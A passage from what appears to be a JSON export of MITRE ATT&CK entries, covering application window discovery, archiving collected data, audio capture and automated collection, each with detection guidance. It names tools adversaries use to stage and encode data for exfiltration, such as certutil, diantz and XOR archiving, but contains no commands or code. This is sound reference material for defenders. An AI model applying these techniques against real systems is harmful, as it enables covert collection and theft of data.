SUPERNOVA Dec 2020),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: JPCert BlackTech Malware September 2019),(Citation: Talos Konni May 2017),(Citation: Aqua Kinsing April 2020),(Citation: Unit42 SilverTerrier 2018),(Citation: Talos Cobalt Strike September 2020),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 Bisonal July 2018),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Unit42 Cannon Nov 2018),(Citation: BitDefender Chafer May 2020),(Citation: FireEye APT34 Dec 2017),(Citation: ESET Sednit Part 2),(Citation: Unit 42 BadPatch Oct 2017),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: Profero APT27 December 2020),(Citation: Checkpoint Dridex Jan 2021),(Citation: JPCert TSCookie March 2018),(Citation: Proofpoint TA505 Jan 2019),(Citation: Kaspersky ProjectSauron Full Report),(Citation: ClearSky Siamesekitten August 2021),(Citation: Secureworks Karagany July 2019),(Citation: Cisco Talos Intelligence Group),(Citation: Talos Cobalt Group July 2018),(Citation: Cybereason Valak May 2020),(Citation: Unit 42 Gamaredon February 2022),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Rancor Unit42 June 2018),(Citation: Microsoft POLONIUM June 2022),(Citation: ESET Sednit Part 1),(Citation: CERT-EE Gamaredon January 2021),(Citation: FireEye APT30),(Citation: Unit 42 Inception November 2018),(Citation: Baumgartner Naikon 2015),(Citation: Unit 42 Sofacy Feb 2018),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Proofpoint NETWIRE December 2020),(Citation: Anomali Pirate Panda April 2020),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Trend Micro IXESHE 2012),(Citation: Lazarus APT January 2022),(Citation: Securelist Remexi Jan 2019),(Citation: ESET Gelsemium June 2021),(Citation: Scarlet Mimic Jan 2016),(Citation: FireEye APT34 Webinar Dec 2017),(Citation: FBI FLASH APT39 September 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Talos TinyTurla September 2021),(Citation: FireEye APT28),(Citation: Volexity SolarWinds),(Citation: NSA/FBI Drovorub August 2020),(Citation: Unit 42 RGDoor Jan 2018),(Citation: FireEye APT10 April 2017),(Citation: CheckPoint Naikon May 2020),(Citation: NCC Group APT15 Alive and Strong),(Citation: Intezer Doki July 20),(Citation: IBM TA505 April 2020),(Citation: Trend Micro TeamTNT),(Citation: ESET Telebots Dec 2016),(Citation: F-Secure CozyDuke),(Citation: Securelist Octopus Oct 2018),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Trend Micro Cyclops Blink March 2022),(Citation: Cado Security TeamTNT Worm August 2020),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: ClearSky MuddyWater June 2019),(Citation: FireEye FELIXROOT July 2018),(Citation: Kaspersky Turla),(Citation: CrowdStrike IceApple May 2022),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Cylance Dust Storm),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: Cylance Machete Mar 2017),(Citation: FireEye APT19),(Citation: IBM Grandoreiro April 2020),(Citation: Novetta Winnti April 2015),(Citation: Malwarebytes Higaisa 2020),(Citation: Intrinsec Egregor Nov 2020),(Citation: Talos GravityRAT),(Citation: BlackBerry Bahamut),(Citation: Malwarebytes Pony April 2016),(Citation: CISA WellMess July 2020),(Citation: Microsoft HAFNIUM March 2020),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Frankenstein June 2019),(Citation: Zscaler Higaisa 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Rewterz Sidewinder APT April 2020),(Citation: F-Secure The Dukes),(Citation: MSTIC FoggyWeb September 2021),(Citation: Chronicle Winnti for Linux May 2019),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: Malwarebytes SmokeLoader 2016),(Citation: GitHub Pupy),(Citation: McAfee GhostSecret),(Citation: Secureworks REvil September 2019),(Citation: Trend Micro DRBControl February 2020),(Citation: TrendMicro macOS Dacls May 2020),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: FoxIT Wocao December 2019),(Citation: CISA AppleJeus Feb 2021),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Kaspersky WIRTE November 2021),(Citation: SecureWorks August 2019),(Citation: Antiy CERT Ramsay April 2020),(Citation: S2 Grupo TrickBot June 2017),(Citation: ESET Okrum July 2019),(Citation: McAfee Lazarus Jul 2020),(Citation: Github PowerShell Empire),(Citation: Fortinet Agent Tesla June 2017),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Sofacy DealersChoice),(Citation: Bitdefender StrongPity June 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Gamaredon June 2020),(Citation: ThreatStream Evasion Analysis),(Citation: Group IB GrimAgent July 2021),(Citation: NCC Group Team9 June 2020),(Citation: Talos ROKRAT),(Citation: McAfee Gold Dragon),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: TrendMicro BlackTech June 2017),(Citation: Malwarebytes Dyreza November 2015),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Bitdefender Naikon April 2021),(Citation: Trend Micro Tick November 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: ESET Turla Mosquito May 2018),(Citation: Unit 42 OilRig Sept 2018),(Citation: FireEye EPS Awakens Part 2),(Citation: FireEye Ursnif Nov 2017),(Citation: CrowdStrike Putter Panda),(Citation: ESET Dukes October 2019),(Citation: Unit 42 Nokki Oct 2018),(Citation: Talos PoetRAT October 2020),(Citation: Intel 471 REvil March 2020),(Citation: Fortinet Diavol July 2021),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Palo Alto menuPass Feb 2017),(Citation: Uptycs Confucius APT Jan 2021),(Citation: ESET TeleBots Oct 2018),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Radware Micropsia July 2018),(Citation: Recorded Future REDDELTA July 2020),(Citation: Moran 2014),(Citation: Cylance Sodinokibi July 2019),(Citation: objective-see windtail2 jan 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Secureworks MCMD July 2019),(Citation: CISA ComRAT Oct 2020),(Citation: DFIR Phosphorus November 2021),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Unit42 RDAT July 2020),(Citation: Proofpoint TA459 April 2017),(Citation: Lab52 WIRTE Apr 2019),(Citation: PaloAlto DNS Requests May 2016),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: 360 Machete Sep 2020),(Citation: Donut Github),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Medium Metamorfo Apr 2020),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Unit42 Redaman January 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Microsoft GALLIUM December 2019),(Citation: FireEye APT33 Guardrail),(Citation: Moran 2013),(Citation: Check Point APT35 CharmPower January 2022),(Citation: synack 2016 review),(Citation: ClearSky Lazarus Aug 2020),(Citation: Accenture Lyceum Targets November 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: McAfee Dianxun March 2021),(Citation: ESET ComRAT May 2020),(Citation: Unit42 OilRig Playbook 2023),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: DustySky),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: FireEye APT10 Sept 2018),(Citation: Proofpoint TA505 Mar 2018),(Citation: Trend Micro njRAT 2018),(Citation: Proofpoint LookBack Malware Aug 2019),"}
{"ID":"T1010","name":"Application Window Discovery","description":"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)\n\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.","url":"https://attack.mitre.org/techniques/T1010","created":"31 May 2017","last modified":"15 April 2023","version":"1.3","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Talos ROKRAT),(Citation: Secureworks Karagany July 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: ESET InvisiMole June 2020),(Citation: Novetta Blockbuster Loaders),(Citation: FireEye Metamorfo Apr 2018),(Citation: Symantec Darkmoon Aug 2005),(Citation: ESET InvisiMole June 2018),(Citation: SecureWorks August 2019),(Citation: ATT QakBot April 2021),(Citation: ESET Grandoreiro April 2020),(Citation: FireEye APT32 May 2017),(Citation: ESET Machete July 2019),(Citation: Symantec Catchamas April 2018),(Citation: Novetta Blockbuster Tools),(Citation: Fidelis njRAT June 2013),(Citation: Red Canary NETWIRE January 2020),(Citation: Novetta Blockbuster),(Citation: Unit 42 Kazuar May 2017),(Citation: Symantec W32.Duqu),(Citation: Carbon Black HotCroissant April 2020),(Citation: ESET Attor Oct 2019),(Citation: Securelist Remexi Jan 2019),(Citation: FireEye APT37 Feb 2018),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Prevailion DarkWatchman 2021),(Citation: Fortinet Metamorfo Feb 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: NTT Security Flagpro new December 2021),(Citation: Symantec Chafer Dec 2015),(Citation: CheckPoint Naikon May 2020),(Citation: Kaspersky NetTraveler),(Citation: Volexity PowerDuke November 2016),"}
{"ID":"T1560","name":"Archive Collected Data","description":"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.","url":"https://attack.mitre.org/techniques/T1560","created":"20 February 2020","last modified":"04 January 2022","version":"1.0","tactics":"Collection","detection":"Archival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, Process: Process Creation, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cybereason PowerLess February 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: McAfee Gold Dragon),(Citation: Villeneuve 2011),(Citation: Cybereason Bumblebee August 2022),(Citation: Fortinet Emotet May 2017),(Citation: CISA WellMail July 2020),(Citation: ESET LightNeuron May 2019),(Citation: ESET TeleBots Oct 2018),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Kaspersky Turla Aug 2014),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Novetta Blockbuster Loaders),(Citation: Novetta-Axiom),(Citation: Novetta Blockbuster RATs),(Citation: FOX-IT May 2016 Mofang),(Citation: Symantec Tick Apr 2016),(Citation: TrendMicro Patchwork Dec 2017),(Citation: trendmicro xcsset xcode project 2020),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: DOJ GRU Indictment Jul 2018),(Citation: US-CERT TA18-074A),(Citation: Trustwave Pillowmint June 2020),(Citation: Symantec Dragonfly),(Citation: ESET Machete July 2019),(Citation: ESET Zebrocy Nov 2018),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Talos Agent Tesla Oct 2018),(Citation: BiZone Lizar May 2021),(Citation: ESET Operation Groundbait),(Citation: GitHub Bloodhound),(Citation: Red Canary NETWIRE January 2020),(Citation: objsee mac malware 2017),(Citation: FireEye FIN6 April 2016),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Github PowerShell Empire),(Citation: ESET ForSSHe December 2018),(Citation: Securelist Remexi Jan 2019),(Citation: FireEye FELIXROOT July 2018),(Citation: ESET Gelsemium June 2021),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Securelist Sofacy Feb 2018),(Citation: CISA Zebrocy Oct 2020),(Citation: ESET Sednit Part 2),(Citation: ESET OceanLotus Mar 2019),(Citation: Kaspersky Turla),(Citation: Unit 42 VERMIN Jan 2018),(Citation: KISA Operation Muzabi),(Citation: Securelist Dtrack),(Citation: DOJ APT10 Dec 2018),(Citation: Symantec Chafer Dec 2015),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Trend Micro Black Basta October 2022),(Citation: CheckPoint Naikon May 2020),"}
{"ID":"T1560.003","name":"Archive Collected Data: Archive via Custom Method","description":"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)","url":"https://attack.mitre.org/techniques/T1560/003","created":"20 February 2020","last modified":"25 March 2020","version":"1.0","tactics":"Collection","detection":"Custom archival methods can be very difficult to detect, since many of them use standard programming language concepts, such as bitwise operations.","platforms":"Linux, Windows, macOS","data sources":"File: File Creation, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1560","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ThreatExpert Agent.btz),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: McAfee Sharpshooter December 2018),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Novetta Blockbuster Loaders),(Citation: Novetta Blockbuster RATs),(Citation: Palo Alto T9000 Feb 2016),(Citation: TrendMicro RawPOS April 2015),(Citation: CopyKittens Nov 2015),(Citation: ESET InvisiMole June 2018),(Citation: FireEye NETWIRE March 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ESET Machete July 2019),(Citation: ESET Okrum July 2019),(Citation: FireEye APT30),(Citation: BlackBerry CostaRicto November 2020),(Citation: Dell TG-3390),(Citation: Trend Micro FIN6 October 2019),(Citation: Mandiant APT41),(Citation: Novetta Blockbuster),(Citation: FireEye FIN6 April 2016),(Citation: Symantec W32.Duqu),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Avira Mustang Panda January 2020),(Citation: ESET Attor Oct 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: FireEye MESSAGETAP October 2019),(Citation: Eset Ramsay May 2020),(Citation: SentinelOne FrameworkPOS September 2019),(Citation: Talos Promethium June 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ESET Sednit Part 2),(Citation: Visa RawPOS March 2015),(Citation: Bitdefender StrongPity June 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Unit 42 RGDoor Jan 2018),(Citation: TrendMicro MacOS April 2018),(Citation: SentinelLabs Metador Sept 2022),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Palo Alto Reaver Nov 2017),"}
{"ID":"T1560.002","name":"Archive Collected Data: Archive via Library","description":"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.","url":"https://attack.mitre.org/techniques/T1560/002","created":"20 February 2020","last modified":"29 March 2020","version":"1.0","tactics":"Collection","detection":"Monitor processes for accesses to known archival libraries. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)","platforms":"Linux, Windows, macOS","data sources":"File: File Creation, Script: Script Execution","is sub-technique":true,"sub-technique of":"T1560","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Palo Alto Networks BBSRAT),(Citation: Securelist Denis April 2017),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Kaspersky Turla Aug 2014),(Citation: ESET InvisiMole June 2018),(Citation: Cylance Dust Storm),(Citation: Mandiant No Easy Breach),(Citation: Kaspersky TajMahal April 2019),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: MSTIC FoggyWeb September 2021),(Citation: Accenture MUDCARP March 2019),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET InvisiMole June 2020),(Citation: Novetta Blockbuster RATs),"}
{"ID":"T1560.001","name":"Archive Collected Data: Archive via Utility","description":"Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)","url":"https://attack.mitre.org/techniques/T1560/001","created":"20 February 2020","last modified":"14 April 2023","version":"1.2","tactics":"Collection","detection":"Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1560","defenses bypassed":null,"contributors":"Mark Wee; Mayan Arora aka Mayan Mohan","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Malwarebytes Kimsuky June 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: NCC Group Chimera January 2021),(Citation: ESET Lazarus Jun 2020),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Mandiant APT1),(Citation: aptsim),(Citation: Securelist Calisto July 2018),(Citation: Symantec Sowbug Nov 2017),(Citation: Microsoft NICKEL December 2021),(Citation: LOLBAS Certutil),(Citation: Radware Micropsia July 2018),(Citation: FoxIT Wocao December 2019),(Citation: Symantec Cicada November 2020),(Citation: McAfee Honeybee),(Citation: FireEye APT39 Jan 2019),(Citation: Symantec Tick Apr 2016),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ESET InvisiMole June 2018),(Citation: Microsoft GALLIUM December 2019),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Symantec Waterbug Jun 2019),(Citation: Antiy CERT Ramsay April 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: ESET Okrum July 2019),(Citation: FireEye APT41 Aug 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Kaspersky MoleRATs April 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: ESET Nomadic Octopus 2018),(Citation: Rclone),(Citation: Microsoft HAFNIUM March 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: objsee mac malware 2017),(Citation: Trend Micro Tick November 2019),(Citation: Morphisec ShellTea June 2019),(Citation: Symantec Elfin Mar 2019),(Citation: GitHub PoshC2),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Volexity Exchange Marauder March 2021),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Symantec Gallmaker Oct 2018),(Citation: Avira Mustang Panda January 2020),(Citation: objective-see windtail2 jan 2019),(Citation: TechNet Certutil),(Citation: FireEye APT37 Feb 2018),(Citation: Eset Ramsay May 2020),(Citation: Symantec Calisto July 2018),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Symantec MuddyWater Dec 2018),(Citation: DFIR Phosphorus November 2021),(Citation: ESET Crutch December 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: CrowdStrike IceApple May 2022),(Citation: Talos PoetRAT April 2020),(Citation: Cybereason Soft Cell June 2019),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Volexity SolarWinds),(Citation: Cycraft Chimera April 2020),(Citation: FireEye APT35 2018),(Citation: GitHub Pupy),(Citation: PWC Cloud Hopper April 2017),(Citation: DFIR Report APT35 ProxyShell March 2022),"}
{"ID":"T1123","name":"Audio Capture","description":"An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.","url":"https://attack.mitre.org/techniques/T1123","created":"31 May 2017","last modified":"30 March 2023","version":"1.0","tactics":"Collection","detection":"Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: 360 Machete Sep 2020),(Citation: f-secure janicab),(Citation: EFF Manul Aug 2016),(Citation: TrendMicro DarkComet Sept 2014),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Fortinet Remcos Feb 2017),(Citation: Radware Micropsia July 2018),(Citation: ESET InvisiMole June 2020),(Citation: Palo Alto T9000 Feb 2016),(Citation: Imminent Unit42 Dec2019),(Citation: ESET InvisiMole June 2018),(Citation: Kaspersky Flame Functionality),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Kaspersky Adwind Feb 2016),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Securelist Machete Aug 2014),(Citation: objsee mac malware 2017),(Citation: PowerSploit Documentation),(Citation: Objective-See MacMa Nov 2021),(Citation: GitHub PowerSploit May 2012),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Cylance Shaheen Nov 2018),(Citation: ESET Attor Oct 2019),(Citation: Janicab),(Citation: Kaspersky TajMahal April 2019),(Citation: FireEye APT37 Feb 2018),(Citation: Zscaler Cobian Aug 2017),(Citation: Kaspersky Flame),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Securelist ScarCruft May 2019),(Citation: FireEye Periscope March 2018),(Citation: Cofense RevengeRAT Feb 2019),(Citation: Malwarebytes DarkComet March 2018),(Citation: Unit 42 Nokki Oct 2018),(Citation: Cylance Machete Mar 2017),(Citation: Symantec Chafer Dec 2015),(Citation: DigiTrust NanoCore Jan 2017),(Citation: GitHub Pupy),"}
{"ID":"T1119","name":"Automated Collection","description":"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.","url":"https://attack.mitre.org/techniques/T1119","created":"31 May 2017","last modified":"11 April 2022","version":"1.1","tactics":"Collection","detection":"Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), as well as through cloud APIs and command line interfaces.","platforms":"IaaS, Linux, SaaS, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Praetorian","permissions required":null,"supports remote":null,"system requirements":"Permissions to access directories, files, and API endpoints that store information of interest.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: SecureWorks BRONZE UNION June 2017),(Citation: NCC Group Chimera January 2021),(Citation: Mandiant APT1),(Citation: Palo Alto Comnie),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Microsoft NICKEL December 2021),(Citation: ESET LightNeuron May 2019),(Citation: Radware Micropsia July 2018),(Citation: FoxIT Wocao December 2019),(Citation: ESET InvisiMole June 2020),(Citation: Symantec Cicada November 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Bankshot),(Citation: FireEye Metamorfo Apr 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Palo Alto T9000 Feb 2016),(Citation: ATT Sidewinder January 2021),(Citation: ESET InvisiMole June 2018),(Citation: Unit42 Redaman January 2019),(Citation: DOJ GRU Indictment Jul 2018),(Citation: ESET Sednit USBStealer 2014),(Citation: Mythc Documentation),(Citation: ESET Zebrocy Nov 2018),(Citation: SentinelOne Valak June 2020),(Citation: Palo Alto Rover),(Citation: Red Canary NETWIRE January 2020),(Citation: Roadtools),(Citation: Trend Micro FIN6 October 2019),(Citation: FireEye FIN6 April 2016),(Citation: GitHub PoshC2),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Frankenstein June 2019),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: ESET Attor Oct 2019),(Citation: ESET RTM Feb 2017),(Citation: Kaspersky TajMahal April 2019),(Citation: FireEye MESSAGETAP October 2019),(Citation: Unit42 OilRig Playbook 2023),(Citation: Eset Ramsay May 2020),(Citation: objective-see windtail2 jan 2019),(Citation: ESET Zebrocy May 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: ESET Crutch December 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Talos PoetRAT April 2020),(Citation: KISA Operation Muzabi),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: ESET Gamaredon June 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: McAfee GhostSecret),"}
